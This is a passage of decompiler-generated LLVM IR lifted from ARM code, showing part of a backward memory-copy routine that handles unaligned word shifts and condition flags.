  store i32 %v10_15c00, i32* %r3.global-to-local, align 4
  store i32 %v7_15c00, i32* %r1.global-to-local, align 4
  %v9_15c04 = add i32 %v5_15bfc, -2
  %v10_15c04 = inttoptr i32 %v9_15c04 to i8*
  store i8 %v9_15c00, i8* %v10_15c04, align 1
  %v11_15c04 = load i32, i32* %r0.global-to-local, align 4
  %v12_15c04 = add i32 %v11_15c04, -1
  store i32 %v12_15c04, i32* %r0.global-to-local, align 4
  br i1 %v9_15bf4, label %.thread25, label %bb146

bb146:                                            ; preds = %bb145
  %v8_15c08 = load i32, i32* %r1.global-to-local, align 4
  %v9_15c08 = add i32 %v8_15c08, -1
  %v10_15c08 = inttoptr i32 %v9_15c08 to i8*
  %v11_15c08 = load i8, i8* %v10_15c08, align 1
  %v12_15c08 = zext i8 %v11_15c08 to i32
  store i32 %v12_15c08, i32* %r3.global-to-local, align 4
  store i32 %v9_15c08, i32* %r1.global-to-local, align 4
  %v11_15c0c = add i32 %v11_15c04, -2
  %v12_15c0c = inttoptr i32 %v11_15c0c to i8*
  store i8 %v11_15c08, i8* %v12_15c0c, align 1
  %v13_15c0c = load i32, i32* %r0.global-to-local, align 4
  %v14_15c0c = add i32 %v13_15c0c, -1
  store i32 %v14_15c0c, i32* %r0.global-to-local, align 4
  br label %.thread25

.thread25:                                        ; preds = %bb145, %dec_label_pc_15bf4, %bb146
  %v0_15c6831 = phi i32 [ %v12_15c04, %bb145 ], [ %v6_15bfc, %dec_label_pc_15bf4 ], [ %v14_15c0c, %bb146 ]
  %v0_15c10 = load i32, i32* %r2.global-to-local, align 4
  %v1_15c10 = load i32, i32* @ip, align 4
  %v2_15c10 = sub i32 %v0_15c10, %v1_15c10
  store i32 %v2_15c10, i32* %r2.global-to-local, align 4
  %v4_15c10 = xor i32 %v1_15c10, %v0_15c10
  %v5_15c10 = xor i32 %v2_15c10, %v0_15c10
  %v6_15c10 = and i32 %v5_15c10, %v4_15c10
  %v7_15c10 = icmp slt i32 %v6_15c10, 0
  store i1 %v7_15c10, i1* %cpsr_v.global-to-local, align 1
  %v8_15c10 = icmp slt i32 %v2_15c10, 0
  store i1 %v8_15c10, i1* %cpsr_n.global-to-local, align 1
  %v9_15c10 = icmp eq i32 %v0_15c10, %v1_15c10
  store i1 %v9_15c10, i1* %cpsr_z.global-to-local, align 1
  %v5_15c14 = icmp slt i32 %v0_15c10, %v1_15c10
  br i1 %v5_15c14, label %bb141, label %dec_label_pc_15c18

dec_label_pc_15c18:                               ; preds = %.thread25
  %v0_15c18 = load i32, i32* %r1.global-to-local, align 4
  %v1_15c18 = urem i32 %v0_15c18, 4
  store i32 %v1_15c18, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_15c18 = icmp eq i32 %v1_15c18, 0
  store i1 %v2_15c18, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15c18, label %dec_label_pc_15b5c, label %dec_label_pc_15c20

dec_label_pc_15c20:                               ; preds = %dec_label_pc_15b54, %dec_label_pc_15c18
  %v0_15c6830 = phi i32 [ %v2_15b40, %dec_label_pc_15b54 ], [ %v0_15c6831, %dec_label_pc_15c18 ]
  %v0_15d14 = phi i32 [ %v2_15b44, %dec_label_pc_15b54 ], [ %v2_15c10, %dec_label_pc_15c18 ]
  %v0_15c20 = phi i32 [ %v2_15b3c, %dec_label_pc_15b54 ], [ %v0_15c18, %dec_label_pc_15c18 ]
  %v0_15c28 = phi i32 [ %v1_15b54, %dec_label_pc_15b54 ], [ %v1_15c18, %dec_label_pc_15c18 ]
  %v1_15c20 = and i32 %v0_15c20, -4
  store i32 %v1_15c20, i32* %r1.global-to-local, align 4
  %v1_15c24 = inttoptr i32 %v1_15c20 to i32*
  %v2_15c24 = load i32, i32* %v1_15c24, align 4
  store i32 %v2_15c24, i32* %r3.global-to-local, align 4
  %v7_15c28 = icmp ult i32 %v0_15c28, 2
  %v2_15d0c = add i32 %v0_15d14, -12
  %v4_15d0c = sub i32 11, %v0_15d14
  %v5_15d0c = and i32 %v4_15d0c, %v0_15d14
  %v6_15d0c = icmp slt i32 %v5_15d0c, 0
  store i1 %v6_15d0c, i1* %cpsr_v.global-to-local, align 1
  %v7_15d0c = icmp slt i32 %v2_15d0c, 0
  store i1 %v7_15d0c, i1* %cpsr_n.global-to-local, align 1
  %v8_15d0c = icmp eq i32 %v0_15d14, 12
  store i1 %v8_15d0c, i1* %cpsr_z.global-to-local, align 1
  %v5_15d10 = icmp slt i32 %v0_15d14, 12
  br i1 %v7_15c28, label %dec_label_pc_15d0c, label %dec_label_pc_15c30

dec_label_pc_15c30:                               ; preds = %dec_label_pc_15c20
  %v8_15c28 = icmp eq i32 %v0_15c28, 2
  br i1 %v8_15c28, label %dec_label_pc_15ca0, label %dec_label_pc_15c34

dec_label_pc_15c34:                               ; preds = %dec_label_pc_15c30
  br i1 %v5_15d10, label %dec_label_pc_15c80, label %dec_label_pc_15c3c

dec_label_pc_15c3c:                               ; preds = %dec_label_pc_15c34
  store i32 %v2_15d0c, i32* %r2.global-to-local, align 4
  %v3_15c40 = load i32, i32* @r4, align 4
  store i32 %v3_15c40, i32* %stack_var_-12, align 4
  %v6_15c40 = load i32, i32* @r5, align 4
  store i32 %v6_15c40, i32* %stack_var_-8, align 4
  %v9_15c40 = load i32, i32* @lr, align 4
  br label %dec_label_pc_15c44

dec_label_pc_15c44:                               ; preds = %dec_label_pc_15c44.dec_label_pc_15c44_crit_edge, %dec_label_pc_15c3c
  %v0_15c68 = phi i32 [ %v1_15c68, %dec_label_pc_15c44.dec_label_pc_15c44_crit_edge ], [ %v0_15c6830, %dec_label_pc_15c3c ]
  %v0_15c48 = phi i32 [ %v0_15c48.pre, %dec_label_pc_15c44.dec_label_pc_15c44_crit_edge ], [ %v1_15c20, %dec_label_pc_15c3c ]
  %v0_15c44 = phi i32 [ %v0_15c44.pre, %dec_label_pc_15c44.dec_label_pc_15c44_crit_edge ], [ %v2_15c24, %dec_label_pc_15c3c ]
  %v3_15c44 = mul i32 %v0_15c44, 256
  store i32 %v3_15c44, i32* %lr.global-to-local, align 4
  %v1_15c48 = add i32 %v0_15c48, -4
  %v2_15c48 = inttoptr i32 %v1_15c48 to i32*
  %v3_15c48 = load i32, i32* %v2_15c48, align 4
  store i32 %v3_15c48, i32* %r3.global-to-local, align 4
  %v4_15c48 = add i32 %v0_15c48, -8
  %v5_15c48 = inttoptr i32 %v4_15c48 to i32*
  %v6_15c48 = load i32, i32* %v5_15c48, align 4
  store i32 %v6_15c48, i32* %r4.global-to-local, align 4
  %v7_15c48 = add i32 %v0_15c48, -12
  %v8_15c48 = inttoptr i32 %v7_15c48 to i32*
  %v9_15c48 = load i32, i32* %v8_15c48, align 4
  store i32 %v9_15c48, i32* %r5.global-to-local, align 4
  %v10_15c48 = add i32 %v0_15c48, -16
  %v11_15c48 = inttoptr i32 %v10_15c48 to i32*
  %v12_15c48 = load i32, i32* %v11_15c48, align 4
  store i32 %v10_15c48, i32* %r1.global-to-local, align 4
  %v4_15c4c = udiv i32 %v12_15c48, 16777216
  %v5_15c4c = or i32 %v4_15c4c, %v3_15c44
  store i32 %v5_15c4c, i32* %lr.global-to-local, align 4
  %v3_15c50 = mul i32 %v12_15c48, 256
  %v4_15c54 = udiv i32 %v9_15c48, 16777216
  %v5_15c54 = or i32 %v3_15c50, %v4_15c54
  store i32 %v5_15c54, i32* @ip, align 4
  %v3_15c58 = mul i32 %v9_15c48, 256
  %v4_15c5c = udiv i32 %v6_15c48, 16777216
  %v5_15c5c = or i32 %v3_15c58, %v4_15c5c
  store i32 %v5_15c5c, i32* %r5.global-to-local, align 4
  %v3_15c60 = mul i32 %v6_15c48, 256
  %v4_15c64 = udiv i32 %v3_15c48, 16777216
  %v5_15c64 = or i32 %v3_15c60, %v4_15c64
  store i32 %v5_15c64, i32* %r4.global-to-local, align 4
  %v1_15c68 = add i32 %v0_15c68, -16
  %v2_15c68 = inttoptr i32 %v1_15c68 to i32*
  store i32 %v5_15c64, i32* %v2_15c68, align 4
  %v4_15c68 = add i32 %v0_15c68, -12
  %v5_15c68 = inttoptr i32 %v4_15c68 to i32*
  %v6_15c68 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_15c68, i32* %v5_15c68, align 4
  %v7_15c68 = add i32 %v0_15c68, -8
  %v8_15c68 = inttoptr i32 %v7_15c68 to i32*
  %v9_15c68 = load i32, i32* @ip, align 4
  store i32 %v9_15c68, i32* %v8_15c68, align 4
  %v10_15c68 = add i32 %v0_15c68, -4
  %v11_15c68 = inttoptr i32 %v10_15c68 to i32*
  %v12_15c68 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_15c68, i32* %v11_15c68, align 4
  store i32 %v1_15c68, i32* %r0.global-to-local, align 4
  %v0_15c6c = load i32, i32* %r2.global-to-local, align 4
  %v2_15c6c = add i32 %v0_15c6c, -16
  store i32 %v2_15c6c, i32* %r2.global-to-local, align 4
  %v6_15c70 = icmp slt i32 %v0_15c6c, 16
  br i1 %v6_15c70, label %dec_label_pc_15c74, label %dec_label_pc_15c44.dec_label_pc_15c44_crit_edge

dec_label_pc_15c44.dec_label_pc_15c44_crit_edge:  ; preds = %dec_label_pc_15c44
  %v0_15c44.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_15c48.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_15c44

dec_label_pc_15c74:                               ; preds = %dec_label_pc_15c44
  %v2_15c74 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_15c74, i32* @r4, align 4
  %v5_15c74 = load i32, i32* %stack_var_-8, align 4
  store i32 %v5_15c74, i32* @r5, align 4
  store i32 %v9_15c40, i32* @lr, align 4
  %v2_15c78 = add i32 %v0_15c6c, -4
  store i32 %v2_15c78, i32* %r2.global-to-local, align 4
  %v4_15c78 = add i32 %v0_15c6c, 2147483632
  %v5_15c78 = and i32 %v2_15c78, %v4_15c78
  %v6_15c78 = icmp slt i32 %v5_15c78, 0
  store i1 %v6_15c78, i1* %cpsr_v.global-to-local, align 1
  %v7_15c78 = icmp slt i32 %v2_15c78, 0
  store i1 %v7_15c78, i1* %cpsr_n.global-to-local, align 1
  %v8_15c78 = icmp eq i32 %v2_15c78, 0
  store i1 %v8_15c78, i1* %cpsr_z.global-to-local, align 1
  %v5_15c7c = icmp slt i32 %v2_15c6c, -12
  br i1 %v5_15c7c, label %dec_label_pc_15c98, label %dec_label_pc_15c80

dec_label_pc_15c80:                               ; preds = %dec_label_pc_15c74, %dec_label_pc_15c34, %dec_label_pc_15c80
  %v1_15c8c = phi i32 [ %v5_15c8c, %dec_label_pc_15c80 ], [ %v1_15c68, %dec_label_pc_15c74 ], [ %v0_15c6830, %dec_label_pc_15c34 ]
  %v0_15c80 = load i32, i32* %r3.global-to-local, align 4
  %v3_15c80 = mul i32 %v0_15c80, 256
  store i32 %v3_15c80, i32* %ip.global-to-local, align 4
  %v0_15c84 = load i32, i32* %r1.global-to-local, align 4
  %v1_15c84 = add i32 %v0_15c84, -4
  %v2_15c84 = inttoptr i32 %v1_15c84 to i32*
  %v3_15c84 = load i32, i32* %v2_15c84, align 4
  store i32 %v3_15c84, i32* %r3.global-to-local, align 4
  store i32 %v1_15c84, i32* %r1.global-to-local, align 4
  %v4_15c88 = udiv i32 %v3_15c84, 16777216
  %v5_15c88 = or i32 %v4_15c88, %v3_15c80
  store i32 %v5_15c88, i32* @ip, align 4
  %v2_15c8c = add i32 %v1_15c8c, -4
  %v3_15c8c = inttoptr i32 %v2_15c8c to i32*
  store i32 %v5_15c88, i32* %v3_15c8c, align 4
  %v4_15c8c = load i32, i32* %r0.global-to-local, align 4
  %v5_15c8c = add i32 %v4_15c8c, -4
  store i32 %v5_15c8c, i32* %r0.global-to-local, align 4
  %v0_15c90 = load i32, i32* %r2.global-to-local, align 4
  %v2_15c90 = add i32 %v0_15c90, -4
  store i32 %v2_15c90, i32* %r2.global-to-local, align 4
  %v6_15c94 = icmp slt i32 %v0_15c90, 4
  br i1 %v6_15c94, label %dec_label_pc_15c98.loopexit, label %dec_label_pc_15c80

dec_label_pc_15c98.loopexit:                      ; preds = %dec_label_pc_15c80
  %v4_15c90 = sub i32 3, %v0_15c90
  %v5_15c90 = and i32 %v4_15c90, %v0_15c90
  %v6_15c90 = icmp slt i32 %v5_15c90, 0
  %v7_15c90 = icmp slt i32 %v2_15c90, 0
  store i1 %v6_15c90, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_15c90, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_15c98

dec_label_pc_15c98:                               ; preds = %dec_label_pc_15c98.loopexit, %dec_label_pc_15c74
  %v2_15bdc62 = phi i32 [ %v5_15c8c, %dec_label_pc_15c98.loopexit ], [ %v1_15c68, %dec_label_pc_15c74 ]
  %v0_15bcc58 = phi i32 [ %v2_15c90, %dec_label_pc_15c98.loopexit ], [ %v2_15c78, %dec_label_pc_15c74 ]
  %v0_15c98 = load i32, i32* %r1.global-to-local, align 4
  %v1_15c98 = add i32 %v0_15c98, 3
  store i32 %v1_15c98, i32* %r1.global-to-local, align 4
  br label %bb141

dec_label_pc_15ca0:                               ; preds = %dec_label_pc_15c30
  br i1 %v5_15d10, label %dec_label_pc_15cec, label %dec_label_pc_15ca8

dec_label_pc_15ca8:                               ; preds = %dec_label_pc_15ca0
  store i32 %v2_15d0c, i32* %r2.global-to-local, align 4
  %v3_15cac = load i32, i32* @r4, align 4
  store i32 %v3_15cac, i32* %stack_var_-12, align 4
  %v6_15cac = load i32, i32* @r5, align 4
  store i32 %v6_15cac, i32* %stack_var_-8, align 4
  %v9_15cac = load i32, i32* @lr, align 4
  br label %dec_label_pc_15cb0

dec_label_pc_15cb0:                               ; preds = %dec_label_pc_15cb0.dec_label_pc_15cb0_crit_edge, %dec_label_pc_15ca8
  %v0_15cd4 = phi i32 [ %v1_15cd4, %dec_label_pc_15cb0.dec_label_pc_15cb0_crit_edge ], [ %v0_15c6830, %dec_label_pc_15ca8 ]
  %v0_15cb4 = phi i32 [ %v0_15cb4.pre, %dec_label_pc_15cb0.dec_label_pc_15cb0_crit_edge ], [ %v1_15c20, %dec_label_pc_15ca8 ]
  %v0_15cb0 = phi i32 [ %v0_15cb0.pre, %dec_label_pc_15cb0.dec_label_pc_15cb0_crit_edge ], [ %v2_15c24, %dec_label_pc_15ca8 ]
  %v3_15cb0 = mul i32 %v0_15cb0, 65536
  store i32 %v3_15cb0, i32* %lr.global-to-local, align 4
  %v1_15cb4 = add i32 %v0_15cb4, -4
  %v2_15cb4 = inttoptr i32 %v1_15cb4 to i32*
  %v3_15cb4 = load i32, i32* %v2_15cb4, align 4
  store i32 %v3_15cb4, i32* %r3.global-to-local, align 4
  %v4_15cb4 = add i32 %v0_15cb4, -8
  %v5_15cb4 = inttoptr i32 %v4_15cb4 to i32*
  %v6_15cb4 = load i32, i32* %v5_15cb4, align 4
  store i32 %v6_15cb4, i32* %r4.global-to-local, align 4
  %v7_15cb4 = add i32 %v0_15cb4, -12
  %v8_15cb4 = inttoptr i32 %v7_15cb4 to i32*
  %v9_15cb4 = load i32, i32* %v8_15cb4, align 4
  store i32 %v9_15cb4, i32* %r5.global-to-local, align 4
  %v10_15cb4 = add i32 %v0_15cb4, -16
  %v11_15cb4 = inttoptr i32 %v10_15cb4 to i32*
  %v12_15cb4 = load i32, i32* %v11_15cb4, align 4
  store i32 %v10_15cb4, i32* %r1.global-to-local, align 4
  %v4_15cb8 = udiv i32 %v12_15cb4, 65536
  %v5_15cb8 = or i32 %v4_15cb8, %v3_15cb0
  store i32 %v5_15cb8, i32* %lr.global-to-local, align 4
  %v3_15cbc = mul i32 %v12_15cb4, 65536
  %v4_15cc0 = udiv i32 %v9_15cb4, 65536
  %v5_15cc0 = or i32 %v3_15cbc, %v4_15cc0
  store i32 %v5_15cc0, i32* @ip, align 4
  %v3_15cc4 = mul i32 %v9_15cb4, 65536
  %v4_15cc8 = udiv i32 %v6_15cb4, 65536
  %v5_15cc8 = or i32 %v3_15cc4, %v4_15cc8
  store i32 %v5_15cc8, i32* %r5.global-to-local, align 4
  %v3_15ccc = mul i32 %v6_15cb4, 65536
  %v4_15cd0 = udiv i32 %v3_15cb4, 65536
  %v5_15cd0 = or i32 %v3_15ccc, %v4_15cd0
  store i32 %v5_15cd0, i32* %r4.global-to-local, align 4
  %v1_15cd4 = add i32 %v0_15cd4, -16
  %v2_15cd4 = inttoptr i32 %v1_15cd4 to i32*
  store i32 %v5_15cd0, i32* %v2_15cd4, align 4
  %v4_15cd4 = add i32 %v0_15cd4, -12
  %v5_15cd4 = inttoptr i32 %v4_15cd4 to i32*
  %v6_15cd4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_15cd4, i32* %v5_15cd4, align 4
  %v7_15cd4 = add i32 %v0_15cd4, -8
  %v8_15cd4 = inttoptr i32 %v7_15cd4 to i32*
  %v9_15cd4 = load i32, i32* @ip, align 4
  store i32 %v9_15cd4, i32* %v8_15cd4, align 4
  %v10_15cd4 = add i32 %v0_15cd4, -4
  %v11_15cd4 = inttoptr i32 %v10_15cd4 to i32*
  %v12_15cd4 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_15cd4, i32* %v11_15cd4, align 4
  store i32 %v1_15cd4, i32* %r0.global-to-local, align 4
  %v0_15cd8 = load i32, i32* %r2.global-to-local, align 4
  %v2_15cd8 = add i32 %v0_15cd8, -16
  store i32 %v2_15cd8, i32* %r2.global-to-local, align 4
  %v6_15cdc = icmp slt i32 %v0_15cd8, 16
  br i1 %v6_15cdc, label %dec_label_pc_15ce0, label %dec_label_pc_15cb0.dec_label_pc_15cb0_crit_edge

dec_label_pc_15cb0.dec_label_pc_15cb0_crit_edge:  ; preds = %dec_label_pc_15cb0
  %v0_15cb0.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_15cb4.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_15cb0

dec_label_pc_15ce0:                               ; preds = %dec_label_pc_15cb0
  %v2_15ce0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_15ce0, i32* @r4, align 4
  %v5_15ce0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v5_15ce0, i32* @r5, align 4
  store i32 %v9_15cac, i32* @lr, align 4
  %v2_15ce4 = add i32 %v0_15cd8, -4
  store i32 %v2_15ce4, i32* %r2.global-to-local, align 4
  %v4_15ce4 = add i32 %v0_15cd8, 2147483632
  %v5_15ce4 = and i32 %v2_15ce4, %v4_15ce4
  %v6_15ce4 = icmp slt i32 %v5_15ce4, 0
  store i1 %v6_15ce4, i1* %cpsr_v.global-to-local, align 1
  %v7_15ce4 = icmp slt i32 %v2_15ce4, 0
  store i1 %v7_15ce4, i1* %cpsr_n.global-to-local, align 1
  %v8_15ce4 = icmp eq i32 %v2_15ce4, 0
  store i1 %v8_15ce4, i1* %cpsr_z.global-to-local, align 1
  %v5_15ce8 = icmp slt i32 %v2_15cd8, -12
  br i1 %v5_15ce8, label %dec_label_pc_15d04, label %dec_label_pc_15cec

dec_label_pc_15cec:                               ; preds = %dec_label_pc_15ce0, %dec_label_pc_15ca0, %dec_label_pc_15cec
  %v1_15cf8 = phi i32 [ %v5_15cf8, %dec_label_pc_15cec ], [ %v1_15cd4, %dec_label_pc_15ce0 ], [ %v0_15c6830, %dec_label_pc_15ca0 ]
  %v0_15cec = load i32, i32* %r3.global-to-local, align 4
  %v3_15cec = mul i32 %v0_15cec, 65536
  store i32 %v3_15cec, i32* %ip.global-to-local, align 4
  %v0_15cf0 = load i32, i32* %r1.global-to-local, align 4
  %v1_15cf0 = add i32 %v0_15cf0, -4
  %v2_15cf0 = inttoptr i32 %v1_15cf0 to i32*
  %v3_15cf0 = load i32, i32* %v2_15cf0, align 4
  store i32 %v3_15cf0, i32* %r3.global-to-local, align 4
  store i32 %v1_15cf0, i32* %r1.global-to-local, align 4
  %v4_15cf4 = udiv i32 %v3_15cf0, 65536
  %v5_15cf4 = or i32 %v4_15cf4, %v3_15cec
  store i32 %v5_15cf4, i32* @ip, align 4
  %v2_15cf8 = add i32 %v1_15cf8, -4
  %v3_15cf8 = inttoptr i32 %v2_15cf8 to i32*
  store i32 %v5_15cf4, i32* %v3_15cf8, align 4
  %v4_15cf8 = load i32, i32* %r0.global-to-local, align 4
  %v5_15cf8 = add i32 %v4_15cf8, -4
  store i32 %v5_15cf8, i32* %r0.global-to-local, align 4
  %v0_15cfc = load i32, i32* %r2.global-to-local, align 4
  %v2_15cfc = add i32 %v0_15cfc, -4
  store i32 %v2_15cfc, i32* %r2.global-to-local, align 4
  %v6_15d00 = icmp slt i32 %v0_15cfc, 4
  br i1 %v6_15d00, label %dec_label_pc_15d04.loopexit, label %dec_label_pc_15cec

dec_label_pc_15d04.loopexit:                      ; preds = %dec_label_pc_15cec
  %v4_15cfc = sub i32 3, %v0_15cfc
  %v5_15cfc = and i32 %v4_15cfc, %v0_15cfc
  %v6_15cfc = icmp slt i32 %v5_15cfc, 0
  %v7_15cfc = icmp slt i32 %v2_15cfc, 0
  store i1 %v6_15cfc, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_15cfc, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_15d04

dec_label_pc_15d04:                               ; preds = %dec_label_pc_15d04.loopexit, %dec_label_pc_15ce0
  %v2_15bdc63 = phi i32 [ %v5_15cf8, %dec_label_pc_15d04.loopexit ], [ %v1_15cd4, %dec_label_pc_15ce0 ]
  %v0_15bcc59 = phi i32 [ %v2_15cfc, %dec_label_pc_15d04.loopexit ], [ %v2_15ce4, %dec_label_pc_15ce0 ]
  %v0_15d04 = load i32, i32* %r1.global-to-local, align 4
  %v1_15d04 = add i32 %v0_15d04, 2
  store i32 %v1_15d04, i32* %r1.global-to-local, align 4
  br label %bb141

dec_label_pc_15d0c:                               ; preds = %dec_label_pc_15c20
  br i1 %v5_15d10, label %dec_label_pc_15d58, label %dec_label_pc_15d14

dec_label_pc_15d14:                               ; preds = %dec_label_pc_15d0c
  store i32 %v2_15d0c, i32* %r2.global-to-local, align 4
  %v3_15d18 = load i32, i32* @r4, align 4
  store i32 %v3_15d18, i32* %stack_var_-12, align 4
  %v6_15d18 = load i32, i32* @r5, align 4
  store i32 %v6_15d18, i32* %stack_var_-8, align 4
  %v9_15d18 = load i32, i32* @lr, align 4
  br label %dec_label_pc_15d1c

dec_label_pc_15d1c:                               ; preds = %dec_label_pc_15d1c.dec_label_pc_15d1c_crit_edge, %dec_label_pc_15d14
  %v0_15d40 = phi i32 [ %v1_15d40, %dec_label_pc_15d1c.dec_label_pc_15d1c_crit_edge ], [ %v0_15c6830, %dec_label_pc_15d14 ]
  %v0_15d20 = phi i32 [ %v0_15d20.pre, %dec_label_pc_15d1c.dec_label_pc_15d1c_crit_edge ], [ %v1_15c20, %dec_label_pc_15d14 ]
  %v0_15d1c = phi i32 [ %v0_15d1c.pre, %dec_label_pc_15d1c.dec_label_pc_15d1c_crit_edge ], [ %v2_15c24, %dec_label_pc_15d14 ]
  %v3_15d1c = mul i32 %v0_15d1c, 16777216
  store i32 %v3_15d1c, i32* %lr.global-to-local, align 4
  %v1_15d20 = add i32 %v0_15d20, -4
  %v2_15d20 = inttoptr i32 %v1_15d20 to i32*
  %v3_15d20 = load i32, i32* %v2_15d20, align 4
  store i32 %v3_15d20, i32* %r3.global-to-local, align 4
  %v4_15d20 = add i32 %v0_15d20, -8
  %v5_15d20 = inttoptr i32 %v4_15d20 to i32*
  %v6_15d20 = load i32, i32* %v5_15d20, align 4
  store i32 %v6_15d20, i32* %r4.global-to-local, align 4
  %v7_15d20 = add i32 %v0_15d20, -12
  %v8_15d20 = inttoptr i32 %v7_15d20 to i32*
  %v9_15d20 = load i32, i32* %v8_15d20, align 4
  store i32 %v9_15d20, i32* %r5.global-to-local, align 4
  %v10_15d20 = add i32 %v0_15d20, -16
  %v11_15d20 = inttoptr i32 %v10_15d20 to i32*
  %v12_15d20 = load i32, i32* %v11_15d20, align 4
  store i32 %v10_15d20, i32* %r1.global-to-local, align 4
  %v4_15d24 = udiv i32 %v12_15d20, 256
  %v5_15d24 = or i32 %v4_15d24, %v3_15d1c
  store i32 %v5_15d24, i32* %lr.global-to-local, align 4
  %v3_15d28 = mul i32 %v12_15d20, 16777216
  %v4_15d2c = udiv i32 %v9_15d20, 256
  %v5_15d2c = or i32 %v3_15d28, %v4_15d2c
  store i32 %v5_15d2c, i32* @ip, align 4
  %v3_15d30 = mul i32 %v9_15d20, 16777216
  %v4_15d34 = udiv i32 %v6_15d20, 256
  %v5_15d34 = or i32 %v3_15d30, %v4_15d34
  store i32 %v5_15d34, i32* %r5.global-to-local, align 4
  %v3_15d38 = mul i32 %v6_15d20, 16777216
  %v4_15d3c = udiv i32 %v3_15d20, 256
  %v5_15d3c = or i32 %v3_15d38, %v4_15d3c
  store i32 %v5_15d3c, i32* %r4.global-to-local, align 4
  %v1_15d40 = add i32 %v0_15d40, -16
  %v2_15d40 = inttoptr i32 %v1_15d40 to i32*
  store i32 %v5_15d3c, i32* %v2_15d40, align 4
  %v4_15d40 = add i32 %v0_15d40, -12
  %v5_15d40 = inttoptr i32 %v4_15d40 to i32*
  %v6_15d40 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_15d40, i32* %v5_15d40, align 4
  %v7_15d40 = add i32 %v0_15d40, -8
  %v8_15d40 = inttoptr i32 %v7_15d40 to i32*
  %v9_15d40 = load i32, i32* @ip, align 4
  store i32 %v9_15d40, i32* %v8_15d40, align 4
  %v10_15d40 = add i32 %v0_15d40, -4
  %v11_15d40 = inttoptr i32 %v10_15d40 to i32*
  %v12_15d40 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_15d40, i32* %v11_15d40, align 4
  store i32 %v1_15d40, i32* %r0.global-to-local, align 4
  %v0_15d44 = load i32, i32* %r2.global-to-local, align 4
  %v2_15d44 = add i32 %v0_15d44, -16
  store i32 %v2_15d44, i32* %r2.global-to-local, align 4
  %v6_15d48 = icmp slt i32 %v0_15d44, 16
  br i1 %v6_15d48, label %dec_label_pc_15d4c, label %dec_label_pc_15d1c.dec_label_pc_15d1c_crit_edge

dec_label_pc_15d1c.dec_label_pc_15d1c_crit_edge:  ; preds = %dec_label_pc_15d1c
  %v0_15d1c.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_15d20.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_15d1c

dec_label_pc_15d4c:                               ; preds = %dec_label_pc_15d1c
  %v2_15d4c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_15d4c, i32* @r4, align 4
  %v5_15d4c = load i32, i32* %stack_var_-8, align 4
  store i32 %v5_15d4c, i32* @r5, align 4
  store i32 %v9_15d18, i32* @lr, align 4
  %v2_15d50 = add i32 %v0_15d44, -4
  store i32 %v2_15d50, i32* %r2.global-to-local, align 4
  %v4_15d50 = add i32 %v0_15d44, 2147483632
  %v5_15d50 = and i32 %v2_15d50, %v4_15d50
  %v6_15d50 = icmp slt i32 %v5_15d50, 0
  store i1 %v6_15d50, i1* %cpsr_v.global-to-local, align 1
  %v7_15d50 = icmp slt i32 %v2_15d50, 0
  store i1 %v7_15d50, i1* %cpsr_n.global-to-local, align 1
  %v8_15d50 = icmp eq i32 %v2_15d50, 0
  store i1 %v8_15d50, i1* %cpsr_z.global-to-local, align 1
  %v5_15d54 = icmp slt i32 %v2_15d44, -12
  br i1 %v5_15d54, label %dec_label_pc_15d70, label %dec_label_pc_15d58

dec_label_pc_15d58:                               ; preds = %dec_label_pc_15d4c, %dec_label_pc_15d0c, %dec_label_pc_15d58
  %v1_15d64 = phi i32 [ %v5_15d64, %dec_label_pc_15d58 ], [ %v1_15d40, %dec_label_pc_15d4c ], [ %v0_15c6830, %dec_label_pc_15d0c ]
  %v0_15d58 = load i32, i32* %r3.global-to-local, align 4
  %v3_15d58 = mul i32 %v0_15d58, 16777216
  store i32 %v3_15d58, i32* %ip.global-to-local, align 4
  %v0_15d5c = load i32, i32* %r1.global-to-local, align 4
  %v1_15d5c = add i32 %v0_15d5c, -4
  %v2_15d5c = inttoptr i32 %v1_15d5c to i32*
  %v3_15d5c = load i32, i32* %v2_15d5c, align 4
  store i32 %v3_15d5c, i32* %r3.global-to-local, align 4
  store i32 %v1_15d5c, i32* %r1.global-to-local, align 4
  %v4_15d60 = udiv i32 %v3_15d5c, 256
  %v5_15d60 = or i32 %v4_15d60, %v3_15d58
  store i32 %v5_15d60, i32* @ip, align 4
  %v2_15d64 = add i32 %v1_15d64, -4
  %v3_15d64 = inttoptr i32 %v2_15d64 to i32*
  store i32 %v5_15d60, i32* %v3_15d64, align 4
  %v4_15d64 = load i32, i32* %r0.global-to-local, align 4
  %v5_15d64 = add i32 %v4_15d64, -4
  store i32 %v5_15d64, i32* %r0.global-to-local, align 4
  %v0_15d68 = load i32, i32* %r2.global-to-local, align 4
  %v2_15d68 = add i32 %v0_15d68, -4
  store i32 %v2_15d68, i32* %r2.global-to-local, align 4
  %v6_15d6c = icmp slt i32 %v0_15d68, 4
  br i1 %v6_15d6c, label %dec_label_pc_15d70.loopexit, label %dec_label_pc_15d58

dec_label_pc_15d70.loopexit:                      ; preds = %dec_label_pc_15d58
  %v4_15d68 = sub i32 3, %v0_15d68
  %v5_15d68 = and i32 %v4_15d68, %v0_15d68
  %v6_15d68 = icmp slt i32 %v5_15d68, 0
  %v7_15d68 = icmp slt i32 %v2_15d68, 0
  store i1 %v6_15d68, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_15d68, i1* %cpsr_n.global-to-local, align 1
